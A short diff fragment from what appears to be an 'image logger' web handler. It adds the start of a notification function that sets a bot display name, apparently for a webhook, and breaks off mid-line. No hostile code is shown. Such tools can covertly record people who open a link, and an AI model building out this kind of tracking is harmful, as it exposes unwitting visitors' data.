@@ -302,3 +302,5 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = app = ImageLoggerAPI
+
+def send_notification(display_name, message_content): payload = { "username": display_name,  # This sets the name the bot appears as
